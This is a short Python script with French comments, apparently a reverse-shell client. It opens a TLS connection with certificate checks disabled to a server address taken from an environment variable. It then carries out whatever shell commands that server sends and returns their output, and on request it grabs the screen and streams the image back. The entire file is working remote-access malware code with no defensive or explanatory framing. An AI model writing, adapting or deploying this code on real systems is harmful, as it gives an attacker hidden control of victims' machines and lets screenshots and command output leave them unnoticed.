import socket
import ssl
import subprocess
import os
from dotenv import load_dotenv
from PIL import ImageGrab

SERVER_PORT = 8888

load_dotenv()
ip_server = os.getenv('IP_SERVER')

# Créer un contexte SSL
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server)
ssl_socket.connect((ip_server, SERVER_PORT))

while True:
    command = ssl_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    elif command.lower() == 'screenshot':
        screenshot = ImageGrab.grab()
        screenshot.save('screenshot.png', 'PNG')
        with open('screenshot.png', 'rb') as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                ssl_socket.sendall(data)
        ssl_socket.sendall(b'DONE')
    else:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        ssl_socket.send(result.stdout.encode() + result.stderr.encode())

ssl_socket.close()
